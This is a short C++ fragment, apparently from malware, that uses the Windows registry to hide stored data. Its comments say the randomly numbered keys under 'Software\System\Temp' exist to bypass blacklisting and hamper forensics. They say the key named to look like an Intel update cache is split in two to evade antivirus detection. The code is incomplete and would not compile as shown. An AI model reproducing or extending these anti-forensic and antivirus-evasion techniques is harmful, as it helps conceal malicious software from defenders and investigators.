#include <windows.h>
#include <ctime>

std::string get_reg_key() {
    srand(time(NULL));
    int r = rand() % 10000;
    return "Software\\System\\Temp\\" + std::to_string(r);
}
// The idea here is to make a lot of temp regkeys to save data it isnt really temp like the folder temp which built in by windows it is just to bypass blacklisting and make it harder on forensics




HKEY hKey;
RegCreateKeyA(HKEY_CURRENT_USER, "Software\\Intel\\Update\\Cache", &hKey);

// The idea is to pass AV trying to find the whole key by seperating the key to 2 fragments
